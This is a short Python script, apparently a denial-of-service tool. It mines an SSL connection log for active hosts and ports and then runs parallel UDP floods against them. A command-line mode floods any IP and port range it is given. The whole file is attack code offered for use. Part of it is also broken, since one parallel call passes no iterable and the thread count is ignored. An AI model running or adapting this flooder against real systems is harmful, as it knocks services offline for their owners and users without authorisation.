from multiprocessing import Pool
from sys import argv

from joblib import Parallel, delayed

from flood import udp_flood
from Targets import find_traffic, sort_ips, make_targets
from cfg import SSL_LOG, FLAGS, THREADS 

    
def bro_dos():
    conns = find_traffic(SSL_LOG,FLAGS)
    ips = sort_ips(conns)
    targets = make_targets(conns, ips)

    for T in targets:
        func = udp_flood(T.ip, T.port, True)
        Parallel(n_jobs = 2)(delayed(func) for i in range(THREADS))

if __name__ == '__main__':
    #try:
    ip = argv[1]
    ports = [argv[2], argv[3]]
    threads = argv[4]
    func = udp_flood(ip, ports, False) 
    print('here')
    Parallel(n_jobs = 10, prefer='threads')(delayed(func))# for i in range(threads))
    
    #except Exception as e:
    #print(e)
    print('pass in arguments as: <ip> <start_port> <end_port> <threads>')
